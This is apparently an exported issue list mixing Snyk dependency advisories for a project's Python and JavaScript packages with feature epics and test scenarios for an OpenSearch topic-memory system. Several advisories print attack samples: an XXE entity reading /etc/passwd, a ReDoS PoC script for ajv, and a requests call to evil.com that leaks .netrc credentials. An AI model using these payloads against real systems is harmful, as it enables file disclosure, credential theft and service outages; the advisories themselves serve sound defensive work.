issues.description:
## XML External Entity (XXE) Injection

**Severity:** high
**Package:** fonttools@4.38.0
**File:** `score-processor-lambda/requirements.txt`

**CVSS Score:** 7.5  
**Snyk Priority Score:** 589/1000

### CVEs
- [CVE-2023-45139](https://nvd.nist.gov/vuln/detail/CVE-2023-45139)

**Fix:** Pin `fonttools` to version 4.43.0 or later.

### Details
## Overview
[fonttools](https://pypi.org/project/fonttools) is a Tools to manipulate font files

Affected versions of this package are vulnerable to XML External Entity (XXE) Injection via the OT-SVG parser in the `svg.py` file.

## Details
XXE Injection is a type of attack against an application that parses XML input.
XML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.

Attacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.

For example, below is a sample XML document, containing an XML element- username.

```
<xml>
<?xml version="1.0" encoding="ISO-8859-1"?>
   <username>John</username>
</xml>
```

An external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.

```
<xml>
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
   <username>&xxe;</username>
</xml>
```

Other XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.

## Remediation
Upgrade `fonttools` to version 4.43.0 or higher.
## References
- [GitHub Commit](https://github.com/fonttools/fonttools/commit/9f61271dc1ca82ed91f529b130fe5dc5c9bf1f4c)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-FONTTOOLS-6133203)
issues.title: [Snyk] SNYK-PYTHON-FONTTOOLS-6133203 in fonttools@4.38.0

issues.description:
## Regular Expression Denial of Service (ReDoS)

**Severity:** high
**Package:** minimatch@9.0.1
**File:** `dashboard/package.json`

**CVSS Score:** 8.7  
**Exploit Maturity:** proof-of-concept  
**Snyk Priority Score:** 614/1000

### CVEs
- [CVE-2026-27904](https://nvd.nist.gov/vuln/detail/CVE-2026-27904)

**Fix:** Pin `minimatch` to version 8.0.6, 9.0.7, 10.2.3 or later.

### Details
## Overview
[minimatch](https://www.npmjs.com/package/minimatch) is a minimal matching utility.

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). An attacker can cause excessive resource consumption and application unresponsiveness by supplying specially crafted nested `extglob` patterns that trigger catastrophic backtracking in the regular expression engine.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test("ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test("ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: "ACCCX". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `minimatch` to version 8.0.6, 9.0.7, 10.2.3 or higher.
## References
- [GitHub Commit](https://github.com/isaacs/minimatch/commit/11d0df6165d15a955462316b26d52e5efae06fce)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-JS-MINIMATCH-15353387)
issues.title: [Snyk] SNYK-JS-MINIMATCH-15353387 in minimatch@9.0.1

issues.description:
Provision the lowest-cost AWS OpenSearch domain via a Python CDK stack in a **separate repository** from Plexus. The stack produces CloudFormation outputs (domain endpoint, ARN, IAM role, index alias names) consumed by the Plexus runtime at configuration time.

This epic is independent of all Plexus code and can be developed in parallel with Epics 1 and 2.

## Definition of Done

- A separate CDK repo exists with a stack that synthesizes a valid CloudFormation template
- OpenSearch domain: single `t3.small.search` node, 10GB EBS, no multi-AZ, no dedicated master
- IAM role for Plexus runtime with `es:ESHttp*` permissions
- Index template with `knn_vector` field for embeddings (384 dimensions)
- Blue/green aliases (`topic-memory-live`, `topic-memory-build`) pre-configured
- All stack outputs exported for Plexus consumption
- CDK synth tests pass

## Depends On

Nothing. This is one of three parallel starting points.

issues.description:
Build a standalone, testable cache layer mapping `hash(normalized_text + model_id + preprocessing_version)` to embedding vectors stored in S3. Fully independent of OpenSearch; developed in parallel with Epics 1 and 3.

Embeddings are expensive to compute. This epic ensures that re-indexing the OpenSearch index does not require re-embedding. The cache is S3-backed for cheapness and lifecycle policy support, with an optional local disk LRU during a run.

## Definition of Done

- `EmbeddingCache` class exists with deterministic key generation, S3 get/put, and graceful error handling
- `EmbeddingService` class provides `batch_embed()` that checks cache first, computes misses via sentence-transformers, and writes through
- All scenarios in child stories pass
- Cache key is `SHA-256(normalize(text) + "|" + model_id + "|" + preprocessing_version)`
- S3 path is `embeddings/{model_id}/{key_prefix}/{key}.json`

## Depends On

Nothing. This is one of three parallel starting points.

## Key Files

- Create: `plexus/analysis/embedding_cache.py`
- Create: `plexus/analysis/embedding_cache_test.py`

## Information Exposure

**Severity:** low
**Package:** util-linux/bsdutils@1:2.41-5
**File:** `score-processor-lambda/Dockerfile`

**CVSS Score:** 5.5  
**Snyk Priority Score:** 150/1000

### CVEs
- [CVE-2022-0563](https://nvd.nist.gov/vuln/detail/CVE-2022-0563)

**Fix:** No automatic fix available. Review manually.

### Details
## NVD Description
**_Note:_** _Versions mentioned in the description apply only to the upstream `util-linux` package and not the `util-linux` package as distributed by `Debian`._
_See `How to fix?` for `Debian:13` relevant fixed versions and status._

A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an "INPUTRC" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.
## Remediation
There is no fixed version for `Debian:13` `util-linux`.

issues.description:
## Cross-site Scripting (XSS)

**Severity:** medium
**Package:** dompurify@3.1.6
**File:** `dashboard/package.json`

**CVSS Score:** 5.1  
**Snyk Priority Score:** 326/1000

### CVEs
- [CVE-2026-0540](https://nvd.nist.gov/vuln/detail/CVE-2026-0540)

**Fix:** Pin `dompurify` to version 2.5.9, 3.3.2 or later.

### Details
## Overview
[dompurify](https://github.com/cure53/DOMPurify) is a DOM-only XSS sanitizer for HTML, MathML and SVG.

Affected versions of this package are vulnerable to Cross-site Scripting (XSS) in the `createDOMPurify()` function, via comments embedded in XML `noscript`, `xmp`, `noembed`, `noframes`, and `iframe` attributes containing scripts.
## Details

Cross-site scripting (or XSS) is a code vulnerability that occurs when an attacker “injects” a malicious script into an otherwise trusted website. The injected script gets downloaded and executed by the end user’s browser when the user interacts with the compromised website.

This is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.

Injecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.

Escaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.
 
The most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. 

### Types of attacks
There are a few methods by which XSS can be manipulated:

|Type|Origin|Description|
|--|--|--|
|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|
|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| 
|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|
|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|

### Affected environments
The following environments are susceptible to an XSS attack:

* Web servers
* Application servers
* Web application environments

### How to prevent
This section describes the top best practices designed to specifically protect your code: 

* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. 
* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. 
* Give users the option to disable client-side scripts.
* Redirect invalid requests.
* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.
* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.
* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.

## Remediation
Upgrade `dompurify` to version 2.5.9, 3.3.2 or higher.
## References
- [GitHub Commit](https://github.com/cure53/DOMPurify/commit/302b51de22535cc90235472c52e3401bedd46f80)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-JS-DOMPURIFY-15371376)
issues.title: [Snyk] SNYK-JS-DOMPURIFY-15371376 in dompurify@3.1.6

## Denial of Service (DoS)

**Severity:** high
**Package:** pillow@9.5.0
**File:** `score-processor-lambda/requirements.txt`

**CVSS Score:** 7.5  
**Snyk Priority Score:** 589/1000

### CVEs
No CVE assigned.

**Fix:** Pin `pillow` to version 10.2.0 or later.

### Details
## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) when using arbitrary strings as text input and the number of characters passed into `PIL.ImageFont.ImageFont.getmask()` is over a certain limit. This can lead to a system crash.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `pillow` to version 10.2.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/commit/2ec53e36e9135fda4e2eb6bbd5343a7facae71da)
- [Pillow Release Notes](https://pillow.readthedocs.io/en/stable/releasenotes/10.2.0.html)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-PILLOW-6219984)
issues.title: [Snyk] SNYK-PYTHON-PILLOW-6219984 in pillow@9.5.0

comments.text:
Feature: Cluster record persistence in OpenSearch

  Scenario: Cluster records indexed alongside item documents
    Given 5 clusters with centroids, p95 distances, and labels
    When persist_clusters(clusters) is called
    Then 5 documents are bulk-indexed with record_type = "cluster"
    And each has fields: cluster_id, centroid_embedding, p95_distance, label, member_count

  Scenario: Cluster retrievable by ID
    Given cluster records have been persisted
    When get_cluster(cluster_id=3) is called
    Then the returned record has cluster_id = 3
    And contains centroid_embedding, p95_distance, label, and member_count

  Scenario: All clusters retrievable
    Given 5 cluster records have been persisted
    When get_all_clusters() is called
    Then 5 cluster records are returned
    And none have record_type = "item"

issues.description:
**As a** memory system, **I want** cluster metadata stored as special documents in OpenSearch, **so that** cluster state can be queried alongside item documents without a separate datastore.

Cluster records (centroid embedding, p95 distance, label, member count) are stored as documents in the same OpenSearch index with a `record_type: "cluster"` field discriminator. This avoids the need for a second index or an external cluster store.

The OpenSearch client gets three new methods:
- `persist_clusters(clusters)`: bulk-index cluster records
- `get_cluster(cluster_id)`: retrieve a single cluster record
- `get_all_clusters()`: retrieve all cluster records (filter by `record_type: cluster`)

## Key Files

- Modify: `plexus/analysis/opensearch_client.py` (add cluster record methods)
- Modify: `plexus/analysis/opensearch_client_test.py`

## Dependencies

- Story plx-b02d58 (Bulk index with blue/green alias swap)
- Story plx-941008 (Cluster from pre-computed embeddings)
issues.title: Cluster record persistence in OpenSearch

comments.text:
Feature: Memory weight update and final report output

  Scenario: Memory weights updated and included in output
    Given existing clusters with prior weights
    And 3 of 5 clusters matched new documents
    When generate() completes
    Then output reflects reinforcement for active clusters and decay for inactive
    And each topic has a memory_tier field

  Scenario: Complete output matches expected schema
    Given a successful run with 5 clusters
    When generate() completes
    Then the output dictionary contains:
      "status" equal to "success"
      "cluster_version" as a non-empty string
      "topics" as a list of 5 dicts each with cluster_id, label, member_count, memory_weight, memory_tier, top_terms
      "summary" as a human-readable string
      "items_processed" as an integer greater than 0
      "cache_hit_rate" as a float between 0.0 and 1.0
      "index_name" as the new index name

  Scenario: Incremental mode assigns new items without re-clustering
    Given config mode = "incremental"
    And 50 new items to process
    And an existing live index with 5 clusters
    When generate() is awaited
    Then KNN search is used to assign each new item to the nearest cluster
    And no global re-clustering is performed
    And memory weights are reinforced for clusters that received new items
    And the output contains "mode": "incremental"

  Scenario: Log output is attached to the report block
    Given a successful run
    When generate() completes
    Then the second element of the return tuple is a non-empty log string
    And it contains timestamps and stage indicators

issues.description:
**As a** report consumer, **I want** the VectorTopicMemory block to apply memory weights and emit a complete report with topic summaries, memory tiers, and run metadata, **so that** I can see persistent vs transient topics at a glance.

This is the capstone story. After clustering (Story 7.2), `generate()`:
- Applies reinforcement to clusters that received new documents
- Applies decay to clusters that did not
- Persists updated weights to OpenSearch
- Assembles the complete output dictionary

Also implements the `mode: incremental` config option: when set, the block skips global re-clustering and instead uses KNN search (Story 4.3) to assign new items to the nearest existing cluster. Memory weights are still reinforced for receiving clusters.

## Output Schema

```json
{
  "status": "success",
  "cluster_version": "20260303-143022",
  "topics": [
    {
      "cluster_id": 0,
      "label": "Billing Complaints",
      "member_count": 45,
      "memory_weight": 0.85,
      "memory_tier": "hot",
      "top_terms": ["billing", "charge", "refund"]
    }
  ],
  "summary": "5 topics identified, 3 hot, 1 warm, 1 cold",
  "items_processed": 500,
  "cache_hit_rate": 0.72,
  "index_name": "topic-memory-20260303-143022",
  "mode": "full"
}
```

## Key Files

- Modify: `plexus/reports/blocks/vector_topic_memory.py`
- Modify: `plexus/reports/blocks/vector_topic_memory_test.py`

## Dependencies

- Story plx-806719 (Memory weight update integrated with cluster records)
- Story plx-a7dcee (Index rebuild and clustering orchestration)

issues.description:
## Heap-based Buffer Overflow

**Severity:** critical
**Package:** pillow@9.5.0
**File:** `score-processor-lambda/requirements.txt`

**CVSS Score:** 9.6  
**Exploit Maturity:** mature  
**Snyk Priority Score:** 909/1000

### CVEs
- [CVE-2023-4863](https://nvd.nist.gov/vuln/detail/CVE-2023-4863)

**Fix:** Pin `pillow` to version 10.0.1 or later.

### Details
## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Heap-based Buffer Overflow when the `ReadHuffmanCodes()` function is used. An attacker can craft a special `WebP` lossless file that triggers the `ReadHuffmanCodes()` function to allocate the HuffmanCode buffer with a size that comes from an array of precomputed sizes: `kTableSize`. The `color_cache_bits` value defines which size to use. The `kTableSize` array only takes into account sizes for 8-bit first-level table lookups but not second-level table lookups. libwebp allows codes that are up to 15-bit (`MAX_ALLOWED_CODE_LENGTH`). When BuildHuffmanTable() attempts to fill the second-level tables it may write data out-of-bounds. The OOB write to the undersized array happens in ReplicateValue.

**Notes:**

This is only exploitable if the `color_cache_bits` value defines which size to use.

This vulnerability was also published on libwebp [CVE-2023-5129](https://security.snyk.io/vuln/SNYK-UNMANAGED-WEBMPROJECTLIBWEBP-5918283)

**Changelog:**

2023-09-12: Initial advisory publication

2023-09-27: Advisory details updated, including CVSS, references

2023-09-27: CVE-2023-5129 rejected as a duplicate of CVE-2023-4863

2023-09-28: Research and addition of additional affected libraries

2024-01-28: Additional fix information
## Remediation
Upgrade `Pillow` to version 10.0.1 or higher.
## References
- [Chrome Releases](https://chromereleases.googleblog.com/2023/09/stable-channel-update-for-desktop_11.html)
- [Github Commit](https://github.com/cefsharp/CefSharp/commit/f2890ba66170afb0bf742839febe4d20449f758c)
- [GitHub PR](https://github.com/electron/electron/pull/39823)
- [GitHub PR](https://github.com/electron/electron/pull/39824)
- [GitHub PR](https://github.com/electron/electron/pull/39825)
- [GitHub PR](https://github.com/electron/electron/pull/39826)
- [GitHub PR](https://github.com/electron/electron/pull/39827)
- [Imagemagick Commit](https://github.com/dlemstra/Magick.NET/commit/d8673e7690007d8c73a37f3a5c8104fa9321a8da)
- [Mozilla Advisory](https://www.mozilla.org/en-US/security/advisories/mfsa2023-40/)
- [PoC](https://blog.isosceles.com/the-webp-0day/)

## Inefficient Algorithmic Complexity

**Severity:** high
**Package:** minimatch@3.1.2
**File:** `dashboard/package.json`

**CVSS Score:** 8.7  
**Exploit Maturity:** proof-of-concept  
**Snyk Priority Score:** 614/1000

### CVEs
- [CVE-2026-27903](https://nvd.nist.gov/vuln/detail/CVE-2026-27903)

**Fix:** Pin `minimatch` to version 3.1.3, 4.2.5, 5.1.8, 6.2.2, 7.4.8, 8.0.6, 9.0.7, 10.2.3 or later.

### Details
## Overview
[minimatch](https://www.npmjs.com/package/minimatch) is a minimal matching utility.

Affected versions of this package are vulnerable to Inefficient Algorithmic Complexity via the `matchOne` function. An attacker can cause significant delays in processing and stall the event loop by supplying specially crafted glob patterns containing multiple non-adjacent GLOBSTAR segments.
## Remediation
Upgrade `minimatch` to version 3.1.3, 4.2.5, 5.1.8, 6.2.2, 7.4.8, 8.0.6, 9.0.7, 10.2.3 or higher.
## References
- [GitHub Commit](https://github.com/isaacs/minimatch/commit/0bf499aa45f5059b56809cc3b75ff3eafeb8d748)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-JS-MINIMATCH-15353389)
issues.title: [Snyk] SNYK-JS-MINIMATCH-15353389 in minimatch@3.1.2

## CVE-2025-15281

**Severity:** low
**Package:** glibc/libc-bin@2.41-12+deb13u1
**File:** `score-processor-lambda/Dockerfile`

**Snyk Priority Score:** 150/1000

### CVEs
- [CVE-2025-15281](https://nvd.nist.gov/vuln/detail/CVE-2025-15281)

**Fix:** No automatic fix available. Review manually.

### Details
## NVD Description
**_Note:_** _Versions mentioned in the description apply only to the upstream `glibc` package and not the `glibc` package as distributed by `Debian`._
_See `How to fix?` for `Debian:13` relevant fixed versions and status._

Calling wordexp with WRDE_REUSE in conjunction with WRDE_APPEND in the GNU C Library version 2.0 to version 2.42 may cause the interface to return uninitialized memory in the we_wordv member, which on subsequent calls to wordfree may abort the process.
## Remediation
There is no fixed version for `Debian:13` `glibc`.

**Severity:** low
**Package:** numpy@1.21.3
**File:** `score-processor-lambda/requirements.txt`

### CVEs
- [CVE-2021-41496](https://nvd.nist.gov/vuln/detail/CVE-2021-41496)

**Fix:** Pin `numpy` to version 1.22.0 or later.

### Details
## Overview
[numpy](https://github.com/numpy/numpy) is a fundamental package needed for scientific computing with Python.

Affected versions of this package are vulnerable to Buffer Overflow due to missing boundary checks in the `array_from_pyobj` function of `fortranobject.c`. This may allow an attacker to conduct Denial of Service by carefully constructing an array with negative values.
## Remediation
Upgrade `numpy` to version 1.22.0 or higher.

issues.description:
## Regular Expression Denial of Service (ReDoS)

**Severity:** high
**Package:** ajv@8.17.1
**File:** `dashboard/package.json`

**CVSS Score:** 8.2  
**Exploit Maturity:** proof-of-concept  
**Snyk Priority Score:** 517/1000

### CVEs
- [CVE-2025-69873](https://nvd.nist.gov/vuln/detail/CVE-2025-69873)

**Fix:** Pin `ajv` to version 6.14.0, 8.18.0 or later.

### Details
## Overview
[ajv](https://www.npmjs.com/package/ajv) is an Another JSON Schema Validator

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper validation of the `pattern` keyword when combined with `$data` references. An attacker can cause the application to become unresponsive and exhaust CPU resources by submitting a specially crafted regular expression payload.

**Note:**

This is only exploitable if the `$data` option is enabled.
## PoC
```javascript
const Ajv = require('ajv');

// Vulnerable configuration — $data enables runtime pattern injection
const ajv = new Ajv({ $data: true });

const schema = {
  type: 'object',
  properties: {
    pattern: { type: 'string' },
    value: {
      type: 'string',
      pattern: { $data: '1/pattern' }  // Pattern comes from the data itself
    }
  }
};

const validate = ajv.compile(schema);

// Malicious payload — both the pattern and the triggering input
const maliciousPayload = {
  pattern: '^(a|a)*$',           // Catastrophic backtracking pattern
  value: 'a'.repeat(30) + 'X'    // 30 'a's followed by 'X' to force full backtracking
};

console.time('attack');
validate(maliciousPayload);       // Blocks the entire Node.js process for ~44 seconds
console.timeEnd('attack');
```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test("ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test("ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: "ACCCX". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `ajv` to version 6.14.0, 8.18.0 or higher.
## References
- [GitHub Commit](https://github.com/ajv-validator/ajv/commit/720a23fa453ffae8340e92c9b0fe886c54cfe0d5)
- [GitHub Issue](https://github.com/ajv-validator/ajv/issues/2581)
- [GitHub PR](https://github.com/ajv-validator/ajv/pull/2585)
- [GitHub PR](https://github.com/ajv-validator/ajv/pull/2588)
- [Red Hat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=2439070)
- [Vulnerability Report](https://github.com/EthanKim88/ethan-cve-disclosures/blob/main/CVE-2025-69873-ajv-ReDoS.md)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-JS-AJV-15274295)

## Insertion of Sensitive Information Into Sent Data

**Severity:** medium
**Package:** requests@2.31.0
**File:** `score-processor-lambda/requirements.txt`

**CVSS Score:** 5.7  
**Exploit Maturity:** proof-of-concept  
**Snyk Priority Score:** 606/1000

### CVEs
- [CVE-2024-47081](https://nvd.nist.gov/vuln/detail/CVE-2024-47081)

**Fix:** Pin `requests` to version 2.32.4 or later.

### Details
## Overview

Affected versions of this package are vulnerable to Insertion of Sensitive Information Into Sent Data due to incorrect URL processing. An attacker could craft a malicious URL that, when processed by the library, tricks it into sending the victim's `.netrc` credentials to a server controlled by the attacker.

**Note:**

This is only exploitable if the `.netrc` file contains an entry for the hostname that the attacker includes in the crafted URL's "intended" part (e.g., `example.com` in `http://example.com:@evil.com/`).
## PoC
```
requests.get('http://example.com:@evil.com/')
```
## Remediation
Upgrade `requests` to version 2.32.4 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/5b4b64c3467fd7a3c03f91ee641aaa348b6bed3b)
- [GitHub Commit](https://github.com/psf/requests/commit/7bc45877a86192af77645e156eb3744f95b47dae)

## Incorrect Regular Expression

**Severity:** high
**Package:** fast-xml-parser@4.4.1
**File:** `dashboard/package.json`

**CVSS Score:** 7.8  
**Exploit Maturity:** proof-of-concept  
**Snyk Priority Score:** 783/1000

### CVEs
- [CVE-2026-25896](https://nvd.nist.gov/vuln/detail/CVE-2026-25896)

**Fix:** Pin `fast-xml-parser` to version 4.5.4, 5.3.5 or later.

### Details
## Overview
[fast-xml-parser](https://www.npmjs.org/package/fast-xml-parser) is a Validate XML, Parse XML, Build XML without C/C++ based libraries

Affected versions of this package are vulnerable to Incorrect Regular Expression in the entity parsing RegEx in DOCTYPE declarations. An attacker can inject arbitrary values that override built-in XML entities by crafting entity names containing `.`, which is interpreted as a regex wildcard, allowing malicious content to be substituted in place of standard entities when the XML is parsed and subsequently rendered or used in sensitive contexts.
## Remediation
Upgrade `fast-xml-parser` to version 4.5.4, 5.3.5 or higher.
## References
- [GitHub Commit](https://github.com/NaturalIntelligence/fast-xml-parser/commit/943ef0eb1b2d3284e72dd74f44a042ee9f07026e)
- [GitHub Commit](https://github.com/NaturalIntelligence/fast-xml-parser/commit/ddcd0acf26ddd682cb0dc15a2bd6aa3b96bb1e69)
- [GitHub Release](https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v5.3.5)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-JS-FASTXMLPARSER-15324289)

## Remote Code Execution (RCE)

**Package:** nltk@3.8.1
**File:** `score-processor-lambda/requirements.txt`

### CVEs

**Fix:** Pin `nltk` to version 3.9 or later.

### Details
## Overview
[nltk](http://www.nltk.org) is a Natural Language Toolkit (NLTK) is a Python package for natural language processing.

Affected versions of this package are vulnerable to Remote Code Execution (RCE) through the integrated data package download functionality. An attacker with control over the [NLTK data index](https://github.com/nltk/nltk_data) can execute arbitrary code by supplying pickled Python code within untrusted packages and trick a user into loading the malicious pickle.

Some packages found to be vulnerable if compromised are `averaged_perceptron_tagger`, `punkt`, `maxent_ne_chunker`, `help/tagsets`, and `maxent_treebank_pos_tagger`.
## Remediation
Upgrade `nltk` to version 3.9 or higher.

comments.text:
Feature: VectorTopicMemory exemplars carry Item ID and identifiers

